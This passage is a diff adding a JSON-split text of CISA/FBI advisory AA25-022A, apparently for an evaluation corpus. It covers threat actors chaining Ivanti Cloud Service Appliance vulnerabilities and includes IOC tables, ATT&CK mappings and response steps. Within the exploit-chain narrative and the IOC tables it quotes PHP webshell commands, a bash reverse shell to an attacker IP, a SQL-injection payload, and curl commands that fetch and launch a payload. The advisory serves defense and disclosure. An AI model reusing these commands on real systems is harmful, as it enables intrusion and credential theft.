@@ -1,0 +1,1002 @@
+[
+ {
+  "id": "p1",
+  "text": "# Threat Actors Chained Vulnerabilities in Ivanti Cloud Service Applications"
+ },
+ {
+  "id": "p2",
+  "text": "> - Publisher: FBI Internet Crime Complaint Center (IC3), CSA listing — advisory id AA25-022A\n> - Date: 2025-01-22\n> - URL: https://www.ic3.gov/CSA/2025/250122.pdf\n> - PDF SHA-256: 00ca2a6b38245d06f085e2ab1ee747ebf178cf2c3c1537319af7e52090526adf (`source.pdf`, 37 pages)\n> - License: U.S. Government work (public domain)\n> - Text: `pdftotext -layout` output; only page furniture removed by `reports/eval/build_corpus.py` (149 lines). No other edits."
+ },
+ {
+  "id": "p3",
+  "text": "Co-Authored by:                                                                                               Product ID: AA25-022A\n                                                                                                                   January 22, 2025"
+ },
+ {
+  "id": "p4",
+  "text": "Threat Actors Chained Vulnerabilities in Ivanti\n       Cloud Service Applications\n       Note: The CVEs in this advisory are unrelated to vulnerabilities (CVE-2025-0282 and CVE-2025-0283) in\n       Ivanti’s Connect Secure, Policy Secure and ZTA Gateways. For more information on mitigating CVE-2025-\n       0282 and CVE-2025-0283, see Ivanti Releases Security Updates for Connect Secure, Policy Secure, and\n       ZTA Gateways."
+ },
+ {
+  "id": "p5",
+  "text": "Summary\n       The Cybersecurity and Infrastructure Security Agency (CISA) and Federal Bureau of Investigation (FBI) are\n       releasing this joint Cybersecurity Advisory in response to exploitation in September 2024 of vulnerabilities\n       in Ivanti Cloud Service Appliances (CSA): CVE-2024-8963, an administrative bypass vulnerability; CVE-\n       2024-9379, a SQL injection vulnerability; and CVE-2024-8190 and CVE-2024-9380, remote code\n       execution vulnerabilities.\n       According to CISA and trusted third-party incident response data, threat actors chained the listed\n       vulnerabilities to gain initial access, conduct remote code execution (RCE), obtain credentials, and implant\n       webshells on victim networks. The actors’ primary exploit paths were two vulnerability chains. One exploit\n       chain leveraged CVE-2024-8963 in conjunction with CVE-2024-8190 and CVE-2024-9380 and the other\n       exploited CVE-2024-8963 and CVE-2024-9379. In one confirmed compromise, the actors moved laterally\n       to two servers.\n       All four vulnerabilities affect Ivanti CSA version 4.6x versions before 519, and two of the vulnerabilities\n       (CVE-2024-9379 and CVE-2024-9380) affect CSA versions 5.0.1 and below; according to Ivanti, these\n       CVEs have not been exploited in version 5.0.[1]\n       Ivanti CSA 4.6 is End-of-Life (EOL) and no longer receives patches or third-party libraries. CISA and FBI\n       strongly encourage network administrators to upgrade to the latest supported version of Ivanti CSA.\n       Network defenders are encouraged to hunt for malicious activity on their networks using the detection"
+ },
+ {
+  "id": "p6",
+  "text": "To report suspicious or criminal activity related to information found in this joint Cybersecurity Advisory, contact\n       your local FBI field office or CISA’s 24/7 Operations Center at Report@cisa.gov or (888) 282-0870. When\n       available, please include the following information regarding the incident: date, time, and location of the incident;\n       type of activity; number of people affected; type of equipment used for the activity; the name of the submitting\n       company or organization; and a designated point of contact.\n       This document is distributed as TLP:CLEAR. Disclosure is not limited. Sources may use TLP:CLEAR when\n       information carries minimal or no foreseeable risk of misuse, in accordance with applicable rules and procedures\n       for public release. Subject to standard copyright rules, TLP:CLEAR information may be distributed without\n       restriction. For more information on the Traffic Light Protocol, see cisa.gov/tlp."
+ },
+ {
+  "id": "p7",
+  "text": "methods and indicators of compromise (IOCs) within this advisory. Credentials and sensitive data stored\n        within the affected Ivanti appliances should be considered compromised. Organizations should collect and\n        analyze logs and artifacts for malicious activity and apply the incident response recommendations within\n        this advisory.\n        For a downloadable copy of IOCs, see:\n                 AA25-022A STIX XML (106KB)\n                 AA25-022A STIX JSON (77KB)"
+ },
+ {
+  "id": "p8",
+  "text": "Table of Contents\n        Summary ............................................................................................................................................................. 1\n        Technical Details ................................................................................................................................................. 4\n           Exploit Chain 1.................................................................................................................................................... 4\n               Lateral Movement .......................................................................................................................................... 5\n           Exploit Chain 2.................................................................................................................................................... 5\n           Detection of Activity............................................................................................................................................ 6\n               Victim Organization 1 ..................................................................................................................................... 6\n               Victim Organization 2 ..................................................................................................................................... 6\n               Victim Organization 3 ..................................................................................................................................... 6\n        Indicators of Compromise ................................................................................................................................... 6\n        MITRE ATT&CK Tactics and Techniques .......................................................................................................... 13\n        Incident Response............................................................................................................................................ 15\n        Mitigations ........................................................................................................................................................ 16\n        Validate Security Controls ................................................................................................................................ 17\n        References ....................................................................................................................................................... 17\n        Contact Information ......................................................................................................................................... 18\n        Disclaimer ......................................................................................................................................................... 18\n        Version History ................................................................................................................................................. 18\n        Appendix A: Encoded and Decoded Scripts .................................................................................................... 19\n           Decoded Python Scripts ................................................................................................................................... 19\n           Decoded datetime.php 'timezone' Exploit base64 Scripts ............................................................................ 24\n        Appendix B: Sudo Commands.......................................................................................................................... 34"
+ },
+ {
+  "id": "p9",
+  "text": "Technical Details\n        Note: This advisory uses the MITRE ATT&CK® Matrix for Enterprise framework, version 16. See the MITRE\n        ATT&CK Tactics and Techniques section of this advisory for a table of the threat actors’ activity mapped to\n        MITRE ATT&CK tactics and techniques.\n        In September 2024, Ivanti released two Security Advisories disclosing exploitation of CVE-2024-8190 and\n        CVE-2024-8963.[2][3] In October 2024, Ivanti released another advisory disclosing exploitation of CVE-\n        2024-9379 and CVE-2024-9380.[1]\n                 CVE-2024-8963 [CWE-22: Path Traversal] is an administrate bypass vulnerability that allows threat\n                  actors to remotely access restricted features within the appliance. When used in conjunction with\n                  CVE-2024-8190 [CWE-78: OS Command Injection], threat actors can remotely authenticate into a\n                  victims’ network and execute arbitrary commands on the appliance [T1219].[2][3]\n                 CVE-2024-9379 [CWE-89: SQL Injection] allows a remote authenticated attacker with admin\n                  privileges to run arbitrary SQL statements.[1]\n                 CVE-2024-9380 [CWE-77: Command Injection] allows a remote authenticated attacker with admin\n                  privileges to obtain RCE.[1]\n        According to Ivanti’s advisories and industry reporting, these vulnerabilities were exploited as zero days.[4]\n        Based on evidence of active exploitation, CISA added CVE-2024-8963, CVE-2024-8190, CVE-2024-9379,\n        and CVE-2024-9380 to its Known Exploited Vulnerabilities (KEV) Catalog.\n        According to CISA and trusted third-party incident response data, threat actors chained the above listed\n        vulnerabilities to gain initial access, conduct RCE, obtain credentials, and implant webshells on victim\n        networks. The primary exploit paths included two vulnerability chains. One exploit chain leveraged CVE-\n        2024-8963 in conjunction with CVE-2024-8190 and CVE-2024-9380. The other chain exploited CVE-2024-\n        8963 and CVE-2024-9379. After exploitation, the actors moved laterally in one victim—other victims had\n        no follow-on activity because they identified anomalous activity and implemented mitigation measures."
+ },
+ {
+  "id": "p10",
+  "text": "Exploit Chain 1\n        The threat actors leveraged CVE-2024-8963 in conjunction with remote code execution vulnerabilities,\n        CVE-2024-8190 and CVE-2024-9380. Acting as a nobody user [T1564.002], the threat actors first sent a\n        GET request to datetime.php to acquire session and cross-site request forgery (CSRF) tokens using GET\n        /client/index.php%3F.php/gsb/datetime[.]php [T1071.001]. They followed this in quick\n        succession with a POST request to the same endpoint, using the TIMEZONE input field to manipulate the\n        setSystemTimeZone function and execute code. In some confirmed compromises, the actors used this\n        method to run base64-encoded Python scripts that harvested encrypted admin credentials from the\n        database [T1552.001]. Note: The actors used multiple script variations. See Appendix A for examples of\n        encoded and decoded scripts.\n        In some cases, the threat actors exfiltrated the encrypted admin credentials then decrypted them offline\n        [TA0010]. In other cases, the threat actors leveraged an executable matching the regular expression\n        php\\w{6} located in the /tmp directory to decrypt the credentials prior to exfiltration—this tool was\n        unrecoverable."
+ },
+ {
+  "id": "p11",
+  "text": "After obtaining credentials, the actors logged in and exploited CVE-2024-9380 to execute commands from\n        a higher privileged account. The actors successfully sent a GET request to /gsb/reports[.]php. They\n        immediately followed this with a POST request using the TW_ID input field to execute code to implant\n        webshells for persistence [T1505.003].\n        In one confirmed compromise, the threat actors tried to create webshells using two different paths:\n                 echo \"<?php system(@\n                  \\$_REQUEST['a']);\">/opt/ivanti/csa/broker/webroot/client/help.php\n                 echo \"<?php system('/bin/sudo '. @\n                  \\$_REQUEST['a']);\" > /opt/landesk/broker/webroot/gsb/help.php\n        In the same compromise, the actors used the exploit to execute the following script to create a reverse\n        Transmission Control Protocol command and control (C2) channel: bash -i\n        >&/dev/tcp/107.173.89[.]16/8000 0>&1.\n        In another compromise, the threat actors maintained their presence on the victim’s system for a longer\n        amount of time. The threat actors used sudo commands to disable the vulnerability in DateTimeTab.php,\n        modify and remove webshells, and remove evidence of exploitation [T1548.003]. See Appendix B for the\n        list of sudo commands used."
+ },
+ {
+  "id": "p12",
+  "text": "Lateral Movement\n        In one case, there was evidence of lateral movement after the threat actors gained access and established\n        a foothold through this exploit chain. It is suspected that the threat actors gained access into a Jenkins\n        server running a vulnerable, outdated version [T1068]. Logs on the Jenkins machine showed that a\n        command in the bash history contained credentials to the postgres server. The threat actors then\n        attempted to log into the Virtual Private Network (VPN) server but were unsuccessful. Prior to moving\n        laterally, the actors likely performed discovery on the CSA device using Obelisk and GoGo to scan for\n        vulnerabilities [T1595.002]."
+ },
+ {
+  "id": "p13",
+  "text": "Exploit Chain 2\n        In one confirmed compromise, the actors used a similar exploit chain, exploiting CVE-2024-8963 in\n        conjunction with CVE-2024-9379, using GET /client/index.php%3f.php/gsb/broker.php for initial\n        access.\n        After the threat actors gained initial access, they attempted to exploit CVE-2024-9379 to create a webshell\n        to gain persistent access. They executed GET and POST requests in quick succession to\n        /client/index.php%3F.php/gsb/broker.php. In the POST body, threat actors entered the following\n        string in the lockout attempts input box: LOCKOUTATTEMPTS = 1 ;INSERT INTO\n        user_info(username, accessed, attempts) VALUES ('''echo -n\n        TnNhV1Z1ZEM5b1pXeHdMbk>>/.k''', NOW(), 10). The first portion of the command\n        (LOCKOUTATTEMPTS=1) fit the format of the application and was properly handled by the application.\n        However, the second portion of the command, a SQL injection [T1190], was not properly handled by the"
+ },
+ {
+  "id": "p14",
+  "text": "application. Regardless, the application processed both commands, allowing the threat actors to insert a\n        user into the user_info table.\n        After inserting valid bash code as a user in the user_info table, the threat actors attempted to login as\n        the user. The authoring agencies believe the threat actors knew this login would fail but were attempting to\n        coerce the application into handling the bash code improperly. In this attempt, the application did not\n        evaluate the validity of the login, but instead ran echo -n TnNhV1Z1ZEM5b1pXeHdMbk>>./k as if it were\n        code. The threat actors repeated the process of echo commands until they built a valid web shell [T1059].\n        However, there were no observations that the threat actors were successful."
+ },
+ {
+  "id": "p15",
+  "text": "Detection of Activity\n        According to incident response data from three victim organizations, the actors were unsuccessful with\n        follow-on activity due to the organizations’ rapid detection of the malicious activity. To remediate\n        exploitation, all three organizations replaced the virtual machines with clean and upgraded versions."
+ },
+ {
+  "id": "p16",
+  "text": "Victim Organization 1\n        The first organization detected malicious activity early in the exploitation. A system administrator detected\n        the anomalous creation of user accounts. After investigation, the organization remediated the incident.\n        While it is likely admin credentials were exfiltrated, there were no signs of lateral movement."
+ },
+ {
+  "id": "p17",
+  "text": "Victim Organization 2\n        This organization had an endpoint protection platform (EPP) installed on their system that alerted when the\n        threat actors executed base64 encoded script to create webshells. There were no indications of webshells\n        successfully being created or of lateral movement."
+ },
+ {
+  "id": "p18",
+  "text": "Victim Organization 3\n        This organization leveraged the IOC findings from the other two victim sites to quickly detect malicious\n        activity. This threat activity included the download and deployment of Obelisk and GoGo Scanner, which\n        generated a large number of logs. The organization used these logs to identify anomalous activity."
+ },
+ {
+  "id": "p19",
+  "text": "Indicators of Compromise\n        See Table 1 through Table 3 for IOCs related to the threat actors’ exploitation of CVE-2024-8963, CVE-\n        2024-8190, CVE-2024-9379, and CVE-2024-9380 in Ivanti CSA.\n        Disclaimer: Some IP addresses in this cybersecurity advisory may be associated with legitimate activity.\n        Organizations are encouraged to investigate the activity around these IP addresses prior to taking action,\n        such as blocking. Activity should not be attributed as malicious without analytical evidence to support they\n        are used at the direction of, or controlled by, threat actors."
+ },
+ {
+  "id": "p20",
+  "text": "Table 1: IP Address Used for Credential Theft, September 2024"
+ },
+ {
+  "id": "p21",
+  "text": "File Name                           IP Address                      Description"
+ },
+ {
+  "id": "p22",
+  "text": "\"/client/index.php%3f.php/gsb/datetime.php      142.171.217[.]195            /var/log/messages"
+ },
+ {
+  "id": "p23",
+  "text": "/var/log/messages-\n          \"/client/index.php%3f.php/gsb/datetime.php      154.64.226[.]166\n                                                                                       20240904.gz"
+ },
+ {
+  "id": "p24",
+  "text": "\"/client/index.php%3f.php/gsb/datetime.php      216.131.75[.]53"
+ },
+ {
+  "id": "p25",
+  "text": "/var/log/messages-\n          \"/client/index.php%3f.php/gsb/datetime.php      23.236.66[.]97\n                                                                                       20240905.gz"
+ },
+ {
+  "id": "p26",
+  "text": "\"/client/index.php%3f.php/gsb/datetime.php      38.207.159[.]76              /var/log/messages-\n                                                                                       20240906.gz"
+ },
+ {
+  "id": "p27",
+  "text": "Table 2: Survey 2, Ivanti CSA Network IOC List, September 2024"
+ },
+ {
+  "id": "p28",
+  "text": "File Name                               IP Address                    Description"
+ },
+ {
+  "id": "p29",
+  "text": "149.154.167[.]41"
+ },
+ {
+  "id": "p30",
+  "text": "95.161.76[.]100"
+ },
+ {
+  "id": "p31",
+  "text": "hxxps://file.io/E50vtqmJP5aa"
+ },
+ {
+  "id": "p32",
+  "text": "hxxps://file.io/RBKuU8gicWt"
+ },
+ {
+  "id": "p33",
+  "text": "hxxps://file.io/frdZ9L18R7Nx"
+ },
+ {
+  "id": "p34",
+  "text": "hxxp://ip.sb"
+ },
+ {
+  "id": "p35",
+  "text": "hxxps://pan.xj.hk/d/\n          6401646e701f5f47518ecef48a308a36/redis"
+ },
+ {
+  "id": "p36",
+  "text": "142.171.217[.]195"
+ },
+ {
+  "id": "p37",
+  "text": "108.174.199[.]200"
+ },
+ {
+  "id": "p38",
+  "text": "206.189.156[.]69"
+ },
+ {
+  "id": "p39",
+  "text": "108.174.199[.]200/Xa27efd2.tmp"
+ },
+ {
+  "id": "p40",
+  "text": "142.171.217[.]195"
+ },
+ {
+  "id": "p41",
+  "text": "Table 3: Additional IOCs Derived from Incident Response, September 2024"
+ },
+ {
+  "id": "p42",
+  "text": "Type                            IOC                                   Description"
+ },
+ {
+  "id": "p43",
+  "text": "Ipv4             107.173.89[.]16"
+ },
+ {
+  "id": "p44",
+  "text": "Ipv4             38.207.159[.]76"
+ },
+ {
+  "id": "p45",
+  "text": "Ipv4             142.171.217[.]195"
+ },
+ {
+  "id": "p46",
+  "text": "Ipv4             154.64.226[.]166"
+ },
+ {
+  "id": "p47",
+  "text": "Ipv4             156.234.193[.]18"
+ },
+ {
+  "id": "p48",
+  "text": "Ipv4             216.131.75[.]53"
+ },
+ {
+  "id": "p49",
+  "text": "Ipv4             205.169.39[.]11"
+ },
+ {
+  "id": "p50",
+  "text": "Ipv4             23.236.66[.]97"
+ },
+ {
+  "id": "p51",
+  "text": "Ipv4             149.154.176[.]41"
+ },
+ {
+  "id": "p52",
+  "text": "Ipv4             95.161.76[.]100"
+ },
+ {
+  "id": "p53",
+  "text": "Ipv4             142.171.217[.]195"
+ },
+ {
+  "id": "p54",
+  "text": "Ipv4             108.174.199[.]200"
+ },
+ {
+  "id": "p55",
+  "text": "Ipv4             206.189.156[.]69"
+ },
+ {
+  "id": "p56",
+  "text": "Ipv4             142.171.217[.]195"
+ },
+ {
+  "id": "p57",
+  "text": "Ipv4             67.217.228[.]83"
+ },
+ {
+  "id": "p58",
+  "text": "Ipv4             203.160.72[.]174"
+ },
+ {
+  "id": "p59",
+  "text": "Ipv4             142.11.217[.]3"
+ },
+ {
+  "id": "p60",
+  "text": "Ipv4             104.168.133[.]228"
+ },
+ {
+  "id": "p61",
+  "text": "Ipv4             64.176.49[.]160"
+ },
+ {
+  "id": "p62",
+  "text": "Ipv4             45.141.215[.]17"
+ },
+ {
+  "id": "p63",
+  "text": "Ipv4             142.171.217[.]195"
+ },
+ {
+  "id": "p64",
+  "text": "Ipv4             98.101.25[.]30"
+ },
+ {
+  "id": "p65",
+  "text": "Type                           IOC                                 Description"
+ },
+ {
+  "id": "p66",
+  "text": "Ipv4             216.131.75[.]53"
+ },
+ {
+  "id": "p67",
+  "text": "Ipv4             134.195.90[.]71"
+ },
+ {
+  "id": "p68",
+  "text": "Ipv4             23.236.66[.]97"
+ },
+ {
+  "id": "p69",
+  "text": "Hash             a50660fb31df96b3328640fdfbeea755"
+ },
+ {
+  "id": "p70",
+  "text": "Hash             53c5b7d124f13039eb62409e1ec2089\n                           d"
+ },
+ {
+  "id": "p71",
+  "text": "Hash             698a752ec1ca43237cb1dc791700afde"
+ },
+ {
+  "id": "p72",
+  "text": "Hash             aa69300617faab4eb39b789ebfeb5abe"
+ },
+ {
+  "id": "p73",
+  "text": "Hash             c2becc553b96ba27d60265d07ec3bd6c"
+ },
+ {
+  "id": "p74",
+  "text": "Hash             c7d20ca6fe596009afaeb725fec8635f   /opt/landesk/broker/webroot/gsb/help.php"
+ },
+ {
+  "id": "p75",
+  "text": "Hash             cacc30e2a5b2683e19e45dc4f191cebc   /opt/ivanti/csa/broker/webroot/client/help.php"
+ },
+ {
+  "id": "p76",
+  "text": "Hash             061e5946c9595e560d64d5a8c65be49    /opt/landesk/broker/webroot/gsb/view.php\n                           e"
+ },
+ {
+  "id": "p77",
+  "text": "Hash             e35cf026057a3729387b7ecfb213ae     /tmp/brokerdebug\n                           62a611f0f1a418876b11c9df3b56885b\n                           ed"
+ },
+ {
+  "id": "p78",
+  "text": "Hash             F7F81AE880A17975F60E1E0FE1A4048    /opt/landesk/broker/webroot/gsb/DateTimeTab.\n                           B                                  php"
+ },
+ {
+  "id": "p79",
+  "text": "Hash             86B62FFD33597FD635E01B95F08BB9     /opt/landesk/broker/webroot/gsb/style.php"
+ },
+ {
+  "id": "p80",
+  "text": "Hash             DD975310201079CACD4CDE6FACAB8C     /opt/landesk/broker/webroot/client/index.php\n                           1D"
+ },
+ {
+  "id": "p81",
+  "text": "Hash             1B20E9310CA815F9E2BD366FB94E14     /sbin/systemd\n                           7F\n                                                              Configuration file at /WpService.conf"
+ },
+ {
+  "id": "p82",
+  "text": "Hash             30f57e14596f1bcad7cc4284d1af4684   /sbin/systemd\n                                                              Configuration file at /WpService.conf"
+ },
+ {
+  "id": "p83",
+  "text": "Type                          IOC                Description"
+ },
+ {
+  "id": "p84",
+  "text": "URL              hxxps://file.io/E50vtqmJP5aa"
+ },
+ {
+  "id": "p85",
+  "text": "URL              hxxps://file.io/RBKuU8gicWt"
+ },
+ {
+  "id": "p86",
+  "text": "URL              hxxps://file.io/frdZ9L18R7Nx"
+ },
+ {
+  "id": "p87",
+  "text": "URL              hxxp://ip.sb"
+ },
+ {
+  "id": "p88",
+  "text": "URL              hxxps://pan.xj.hk/d/\n                           6401646e701f5f47518ecef48a308a36\n                           /redis"
+ },
+ {
+  "id": "p89",
+  "text": "URL              108.174.199.200/Xa27efd2.tmp"
+ },
+ {
+  "id": "p90",
+  "text": "URL              45.33.101.53/log"
+ },
+ {
+  "id": "p91",
+  "text": "URL              45.33.101.53/log2"
+ },
+ {
+  "id": "p92",
+  "text": "URL              cri07nnrg958pkh6qhk0977u8c83jog6t.o\n                           ast[.]fun"
+ },
+ {
+  "id": "p93",
+  "text": "URL              cri07nnrg958pkh6qhk0yrgy1e76p1od6.o\n                           ast[.]fun"
+ },
+ {
+  "id": "p94",
+  "text": "domain           gg.oyr2ohrm.eyes[.]sh"
+ },
+ {
+  "id": "p95",
+  "text": "domain           ggg.oyr2ohrm.eyes[.]sh"
+ },
+ {
+  "id": "p96",
+  "text": "domain           gggg.oyr2ohrm.eyes[.]sh"
+ },
+ {
+  "id": "p97",
+  "text": "domain           txt.xj[.]hk"
+ },
+ {
+  "id": "p98",
+  "text": "domain           book.hacktricks[.]xyz"
+ },
+ {
+  "id": "p99",
+  "text": "host             sh -c setsid /dev/shm/redis &"
+ },
+ {
+  "id": "p100",
+  "text": "host             sh -c curl -k\n                           https://file[.]io/1zqvMYY1dpkk -o\n                           /dev/shm/redis2"
+ },
+ {
+  "id": "p101",
+  "text": "host             sh -c mv /dev/shm/redis2\n                           /dev/shm/redis"
+ },
+ {
+  "id": "p102",
+  "text": "Type                          IOC                                    Description"
+ },
+ {
+  "id": "p103",
+  "text": "host             sh -c rm /dev/shm/*"
+ },
+ {
+  "id": "p104",
+  "text": "host             rm /dev/shm/PostgreSQL.1014868572\n                           /dev/shm/redis"
+ },
+ {
+  "id": "p105",
+  "text": "host             78cc672218949a9ec87407ad3bcb5db         Agent.zip"
+ },
+ {
+  "id": "p106",
+  "text": "host             d13f71e51b38ffef6b9dc8efbed27615        Log.log"
+ },
+ {
+  "id": "p107",
+  "text": "host             d88bfac2b43509abdc70308bef75e2a6        Log.exe"
+ },
+ {
+  "id": "p108",
+  "text": "host             R.exe (MD5:                             R.exe\n                           60d5648d35bacf5c7aa713b2a0d267d3\n                           )"
+ },
+ {
+  "id": "p109",
+  "text": "host             ae51c891d2e895b5ca919d14edd42c2         CAService.exe"
+ },
+ {
+  "id": "p110",
+  "text": "host             d88bfac2b43509abdc70308bef75e2a6        Lgfxsys.exe"
+ },
+ {
+  "id": "p111",
+  "text": "host             f82847bccb621e6822a3947bc9ce9621        NetlO.cfg"
+ },
+ {
+  "id": "p112",
+  "text": "host             c894f55c8fa9d92e2dd2c78172cff745        XboVFyKw.tmp"
+ },
+ {
+  "id": "p113",
+  "text": "host             MD5: Unknown                            Wi.bat"
+ },
+ {
+  "id": "p114",
+  "text": "host             MD5: Unknown                            dCUgGXfm.tmp"
+ },
+ {
+  "id": "p115",
+  "text": "host             MD5: Unknown                            DijZViHC.tmp"
+ },
+ {
+  "id": "p116",
+  "text": "/var/secure      nobody : user NOT in sudoers ;\n          log              TTY=unknown ;\n                           PWD=/opt/landesk/broker/webroot/gsb ;\n                           USER=root ; COMMAND=/bin/ln -sf"
+ },
+ {
+  "id": "p117",
+  "text": "/var/secure      nobody : user NOT in sudoers ;\n          log              TTY=unknown ;\n                           PWD=/opt/landesk/broker/webroot/gsb ;\n                           USER=root ; COMMAND=/bin/mv\n                           /tmp/php.ini /etc/php.ini"
+ },
+ {
+  "id": "p118",
+  "text": "Type                            IOC                  Description"
+ },
+ {
+  "id": "p119",
+  "text": "/var/secure      nobody : user NOT in sudoers ;\n          log              TTY=unknown ;\n                           PWD=/opt/landesk/broker/webroot/gsb ;\n                           USER=root ; COMMAND=/sbin/hwclock --\n                           localtime --systohc"
+ },
+ {
+  "id": "p120",
+  "text": "/var/secure      nobody : user NOT in sudoers ;\n          log              TTY=unknown ;\n                           PWD=/opt/landesk/broker/webroot/gsb ;\n                           USER=root ;\n                           COMMAND=/subin/backuptool --fullList"
+ },
+ {
+  "id": "p121",
+  "text": "Ipv4             142.171.217[.]195"
+ },
+ {
+  "id": "p122",
+  "text": "Ipv4             107.173.89[.]16"
+ },
+ {
+  "id": "p123",
+  "text": "Ipv4             192.42.116[.]210"
+ },
+ {
+  "id": "p124",
+  "text": "Ipv4             82.197.182[.]161"
+ },
+ {
+  "id": "p125",
+  "text": "Ipv4             154.213.185[.]230"
+ },
+ {
+  "id": "p126",
+  "text": "Ipv4             216.131.75[.]53"
+ },
+ {
+  "id": "p127",
+  "text": "Ipv4             23.236.66[.]97"
+ },
+ {
+  "id": "p128",
+  "text": "Ipv4             208.105.190[.]170"
+ },
+ {
+  "id": "p129",
+  "text": "Ipv4             136.144.17[.]145"
+ },
+ {
+  "id": "p130",
+  "text": "Ipv4             136.144.17[.]133"
+ },
+ {
+  "id": "p131",
+  "text": "Ipv4             216.73.162[.]56"
+ },
+ {
+  "id": "p132",
+  "text": "Ipv4             104.28.240[.]123"
+ },
+ {
+  "id": "p133",
+  "text": "Ipv4             163.5.171[.]49"
+ },
+ {
+  "id": "p134",
+  "text": "Ipv4             89.187.178[.]179"
+ },
+ {
+  "id": "p135",
+  "text": "Ipv4             163.5.171[.]49"
+ },
+ {
+  "id": "p136",
+  "text": "Ipv4             203.160.86[.]69"
+ },
+ {
+  "id": "p137",
+  "text": "Type                               IOC                                        Description"
+ },
+ {
+  "id": "p138",
+  "text": "Ipv4             185.220.69[.]83"
+ },
+ {
+  "id": "p139",
+  "text": "Ipv4             185.199.103[.]196"
+ },
+ {
+  "id": "p140",
+  "text": "Ipv4             188.172.229[.]15"
+ },
+ {
+  "id": "p141",
+  "text": "Ipv4             155.138.215[.]144"
+ },
+ {
+  "id": "p142",
+  "text": "Ipv4             64.176.49[.]160"
+ },
+ {
+  "id": "p143",
+  "text": "Ipv4             185.40.4[.]38"
+ },
+ {
+  "id": "p144",
+  "text": "Ipv4             216.131[.]75.53"
+ },
+ {
+  "id": "p145",
+  "text": "Ipv4             185.40.4[.]95"
+ },
+ {
+  "id": "p146",
+  "text": "MITRE ATT&CK Tactics and Techniques\n        See Table 4 to Table 13 for all referenced threat actor tactics and techniques in this advisory. For\n        assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE\n        ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool."
+ },
+ {
+  "id": "p147",
+  "text": "Table 4: Reconnaissance"
+ },
+ {
+  "id": "p148",
+  "text": "Technique Title               ID                                        Use"
+ },
+ {
+  "id": "p149",
+  "text": "Active Scanning:                             Threat actors performed reconnaissance by using Obelisk and GoGo\n                                        T1595.002\n          Vulnerability Scanning                       to scan for vulnerabilities."
+ },
+ {
+  "id": "p150",
+  "text": "Table 5: Initial Access"
+ },
+ {
+  "id": "p151",
+  "text": "Technique Title               ID                                        Use"
+ },
+ {
+  "id": "p152",
+  "text": "Threat actors leveraged weaknesses in applications that are not\n          Exploit Public-Facing\n                                        T1190          properly handled to compromise network device protocols, perform\n          Application\n                                                       SQL injections, and generally exploit applications."
+ },
+ {
+  "id": "p153",
+  "text": "Table 6: Execution"
+ },
+ {
+  "id": "p154",
+  "text": "Technique Title               ID                                        Use"
+ },
+ {
+  "id": "p155",
+  "text": "Command and                                  Threat actors abused command and script interpreters to execute\n                                          T1059\n          Scripting Interpreter                        commands, scripts, or binaries."
+ },
+ {
+  "id": "p156",
+  "text": "Table 7: Persistence"
+ },
+ {
+  "id": "p157",
+  "text": "Technique Title              ID                                         Use"
+ },
+ {
+  "id": "p158",
+  "text": "Threat actors executed an authentication bypass by exploiting the\n          Modify Authentication\n                                         T1556      authentication mechanisms of a device to gain access to\n          Process\n                                                    organizations’ networks."
+ },
+ {
+  "id": "p159",
+  "text": "Server Software\n                                        T1505.003   Threat actors executed code to implant webshells for persistence.\n          Component: Web Shell"
+ },
+ {
+  "id": "p160",
+  "text": "Table 8: Privilege Escalation"
+ },
+ {
+  "id": "p161",
+  "text": "Technique Title              ID                                         Use"
+ },
+ {
+  "id": "p162",
+  "text": "Exploitation for                          Threat actors leveraged weaknesses to gain access via an outdated,\n                                         T1068\n          Privilege Escalation                      vulnerable version of a server."
+ },
+ {
+  "id": "p163",
+  "text": "Table 9: Defense Evasion"
+ },
+ {
+  "id": "p164",
+  "text": "Technique Title              ID                                         Use"
+ },
+ {
+  "id": "p165",
+  "text": "Hide Artifacts: Hidden                    Threat actors acted as a hidden user to disguise their presence on a\n                                        T1564.002\n          Users                                     system."
+ },
+ {
+  "id": "p166",
+  "text": "Deobfuscate/Decode                        Threat actors decrypted credentials prior to exfiltration by leveraging\n                                         T1140\n          Files or Information                      native tools located in the extracted backup file."
+ },
+ {
+  "id": "p167",
+  "text": "Abuse Elevation\n          Control Mechanism:                        Threat actors used sudo commands to disable vulnerabilities, modify\n                                        T1548.003\n          Sudo and Sudo                             and remove webshells, and remove evidence of exploitation.\n          Caching"
+ },
+ {
+  "id": "p168",
+  "text": "Table 10: Credential Access"
+ },
+ {
+  "id": "p169",
+  "text": "Technique Title              ID                                         Use"
+ },
+ {
+  "id": "p170",
+  "text": "Unsecured\n                                                    Threat actors harvested encrypted admin credentials to gain further\n          Credentials:                  T1552.001\n                                                    access.\n          Credentials in Files"
+ },
+ {
+  "id": "p171",
+  "text": "Table 11: Lateral Movement"
+ },
+ {
+  "id": "p172",
+  "text": "Technique Title               ID                                        Use"
+ },
+ {
+  "id": "p173",
+  "text": "Threat actors exploited CSAs via remote services to gain access to\n          Exploitation of\n                                          T1210       an organization’s networks by leveraging programming errors, EOL\n          Remove Services\n                                                      systems, and operating systems."
+ },
+ {
+  "id": "p174",
+  "text": "Table 12: Command and Control"
+ },
+ {
+  "id": "p175",
+  "text": "Technique Title               ID                                        Use"
+ },
+ {
+  "id": "p176",
+  "text": "Remote Access                               Threat actors attempted to remotely authenticate into a victim’s\n                                          T1219\n          Software                                    network and execute arbitrary commands on the appliance."
+ },
+ {
+  "id": "p177",
+  "text": "Application Layer: Web                      Threat actors used tools such as GET or POST requests to acquire\n                                        T1071.001\n          Protocol                                    session and CSRF tokens."
+ },
+ {
+  "id": "p178",
+  "text": "Table 13: Exfiltration"
+ },
+ {
+  "id": "p179",
+  "text": "Technique Title               ID                                        Use"
+ },
+ {
+  "id": "p180",
+  "text": "Threat actors exfiltrated encrypted admin credentials or other\n          Exfiltration                   TA0010\n                                                      encrypted data for future use."
+ },
+ {
+  "id": "p181",
+  "text": "Incident Response\n        If compromise is detected, the authoring agencies recommend that organizations:\n             1. Quarantine or take offline potentially affected hosts.\n             2. Reimage compromised hosts.\n             3. Provision new account credentials.\n             4. For Ivanti hosts with Active Directory (AD) access, threat actors can trivially export active domain\n                administrator credentials during initial compromise. Until there is evidence to the contrary, it is\n                assumed that AD access on compromised systems is connected to external authentication systems\n                such as Lightweight Directory Access Protocol and AD.\n             5. Collect and review artifacts such as running processes/services, unusual authentications, and\n                recent network connections.\n                Note: Removing malicious administrator accounts may not fully mitigate risk considering threat\n                actors may have established additional persistence mechanisms.\n             6. Report the compromise to CISA via CISA’s 24/7 Operations Center (report@cisa.gov or 888-282-\n                0870)."
+ },
+ {
